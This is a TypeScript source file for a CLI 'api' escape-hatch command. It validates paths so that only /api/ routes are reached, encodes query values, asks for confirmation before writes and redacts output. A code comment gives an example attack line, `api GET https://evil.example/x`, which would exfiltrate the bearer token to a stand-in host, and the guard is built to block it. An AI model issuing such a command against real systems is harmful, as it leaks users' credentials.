import { defineCommand } from 'citty'
import { createClient, urlArg } from '../client.js'
import { CliError } from '../errors.js'
import { readJsonFile, requireConfirmation, resolveForceFlag, toStringArray } from '../lib/args.js'
import { emit, jsonArg } from '../lib/output.js'

const METHODS = ['GET', 'POST', 'PATCH', 'PUT', 'DELETE'] as const
type Method = (typeof METHODS)[number]

/**
 * Only `/api/…` may be reached, and the check is on the raw string rather than
 * on a parsed URL.
 *
 * The path is concatenated onto the configured instance URL inside the client,
 * which means an absolute URL here would send the caller's bearer token to
 * whatever host they typed — `api GET https://evil.example/x` is a one-line
 * token exfiltration. Three shapes have to die together: an absolute URL
 * (`https://host/…`), a protocol-relative one (`//host/…`, which `fetch`
 * resolves against the scheme and not against the base path), and anything
 * carrying a scheme separator at all, since an unknown scheme (`file://`,
 * `evil.example://`) is no safer for being unrecognised.
 *
 * Requiring the literal `/api/` prefix covers all three at once and needs no
 * URL parser to be trusted — a parser is exactly where this class of guard
 * usually leaks.
 */
function assertApiPath(path: string): void {
  if (path.includes('://') || path.startsWith('//') || !path.startsWith('/api/')) {
    throw new CliError(
      [
        `Invalid path: "${path}". The path must start with /api/ and be relative to the`,
        'instance URL (e.g. /api/agents). Absolute URLs are refused so the bearer token is',
        'never sent to another host — use --url to target a different instance.',
      ].join('\n'),
      { type: 'validation', subtype: 'invalid_path', hint: '--url <instance>' },
    )
  }
}

function normalizeMethod(raw: string): Method {
  const method = raw.trim().toUpperCase()
  if (!(METHODS as readonly string[]).includes(method)) {
    throw new CliError(`Unsupported method: ${raw} (allowed: ${METHODS.join(' | ')})`, {
      type: 'validation',
      subtype: 'invalid_method',
      hint: METHODS.join(' | '),
    })
  }
  return method as Method
}

/**
 * Append `--query k=v` pairs, preserving any query string already written into
 * the path. Values are encoded rather than trusted: an unencoded `&` or space
 * in a search term would otherwise silently split into extra parameters.
 */
function withQuery(path: string, query: unknown): string {
  const pairs = toStringArray(query)
  if (pairs.length === 0) return path
  const encoded = pairs.map((pair) => {
    const eq = pair.indexOf('=')
    if (eq <= 0) throw new CliError(`--query must be key=value, got: "${pair}"`)
    return `${encodeURIComponent(pair.slice(0, eq).trim())}=${encodeURIComponent(pair.slice(eq + 1))}`
  })
  return `${path}${path.includes('?') ? '&' : '?'}${encoded.join('&')}`
}

function resolveBody(args: Record<string, unknown>): unknown {
  const inline = args.body
  const file = args['body-file']
  if (typeof inline === 'string' && typeof file === 'string') {
    throw new CliError('--body and --body-file are mutually exclusive; pass only one.')
  }
  if (typeof file === 'string') return readJsonFile(file, 'body-file')
  if (typeof inline !== 'string') return {}
  try {
    return JSON.parse(inline)
  } catch (err) {
    throw new CliError(`--body is not valid JSON: ${(err as Error).message}`)
  }
}

export const apiCommand = defineCommand({
  meta: {
    name: 'api',
    agentMeta: { risk: 'high-risk-write' },
    description: [
      'Call any a2wave API endpoint directly (raw HTTP escape hatch).',
      'Prefer the typed command when one exists: it validates parameters, resolves names to',
      'IDs, and carries usage guidance this command cannot. Reach for `api` only when an',
      'endpoint has no typed command yet — see /api/docs for the full route list.',
    ].join(' '),
  },
  args: {
    method: {
      type: 'positional',
      description: `HTTP method: ${METHODS.join(' | ')} (case-insensitive)`,
      required: true,
    },
    path: {
      type: 'positional',
      description: 'API path relative to the instance URL, e.g. /api/agents',
      required: true,
    },
    body: { type: 'string', description: 'Request body as a JSON string' },
    'body-file': { type: 'string', description: 'Read the request body from a JSON file' },
    query: {
      type: 'string',
      description: 'Query parameter as key=value (repeatable)',
    },
    yes: {
      type: 'boolean',
      description: 'Confirm the write without prompting (required for non-GET in scripts/CI)',
    },
    ...jsonArg,
    ...urlArg,
  },
  run: async ({ args }) => {
    const method = normalizeMethod(args.method as string)
    const rawPath = args.path as string
    assertApiPath(rawPath)
    const path = withQuery(rawPath, args.query)

    // Parse the body BEFORE prompting: a typo in --body should not cost the
    // caller a confirmation they then have to answer again.
    const body = method === 'GET' ? undefined : resolveBody(args)

    // The CLI cannot know what an arbitrary write does, so it assumes the worst
    // and carries the `high-risk-write` label for the whole command. A GET is
    // downgraded here rather than in the label, since a single leaf gets one
    // static risk and the escape hatch's worst case is what a caller must plan
    // for. `requireConfirmation` keeps the agent-safe semantics: --yes/--force
    // proceeds, a non-TTY throws instead of running unattended.
    await requireConfirmation(
      method === 'GET' ? 'read' : 'high-risk-write',
      `${method} ${path} may create, modify or delete data irreversibly.`,
      resolveForceFlag(args),
    )

    const client = createClient({ url: args.url as string | undefined })
    let result: unknown
    switch (method) {
      case 'GET':
        result = await client.get(path)
        break
      case 'POST':
        result = await client.post(path, body)
        break
      case 'PATCH':
        result = await client.patch(path, body)
        break
      case 'PUT':
        result = await client.put(path, body)
        break
      case 'DELETE':
        result = await client.del(path)
        break
    }

    // JSON unconditionally: this command has no human-formatted alternative to
    // fall back to, and inventing a second formatting path would mean a second
    // place for the redaction to be forgotten. Forcing `json` through emit()
    // keeps --show-secrets, --json-pretty and --fields working as everywhere
    // else — and redaction matters MORE here, since `api` can reach endpoints
    // the denylist has never seen.
    emit({ ...args, json: true }, result)
  },
})
